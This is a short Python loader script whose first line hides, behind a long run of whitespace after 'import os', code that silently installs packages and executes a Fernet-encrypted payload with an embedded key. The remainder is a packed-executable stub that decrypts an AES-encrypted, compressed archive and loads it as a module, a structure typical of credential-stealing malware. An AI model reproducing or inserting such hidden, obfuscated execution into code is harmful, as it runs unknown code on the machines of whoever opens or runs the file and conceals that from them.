import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'HcFemx9QALfy8pq16M2mB_CRctKOYCikEmq7HpFNBpk=').decrypt(b'gAAAAABnSxaCg8vpTlt7fukJKZv3s90_KqETI_4xntBbBo8rIm3JNanbKK71DDrIYq_q7Vwre7b0vPRvuS9s78BQDGWwlNnm2RIdGwDktsdkhaM70dVNTqTu2JJz72fqqmrtGR2xMMM8CpkATNGDvJtJ1cZJL3NRD0PLZPnuZQBOxyK3uIB4Q63MaQRLB18LkTzQsKkBhaBVV9IrpwATdic35IHXJfGGMKAP9jc-EjRT9nQEsSufMAU='))
import os, sys, base64, zlib
from pyaes import AESModeOfOperationGCM
from zipimport import zipimporter

zipfile = os.path.join(sys._MEIPASS, "blank.aes")
module = "stub-o"

key = base64.b64decode("%key%")
iv = base64.b64decode("%iv%")

def decrypt(key, iv, ciphertext):
    return AESModeOfOperationGCM(key, iv).decrypt(ciphertext)

if os.path.isfile(zipfile):
    with open(zipfile, "rb") as f:
        ciphertext = f.read()
    ciphertext = zlib.decompress(ciphertext[::-1])
    decrypted = decrypt(key, iv, ciphertext)
    with open(zipfile, "wb") as f:
        f.write(decrypted)
    
    zipimporter(zipfile).load_module(module)
print('mbadyp')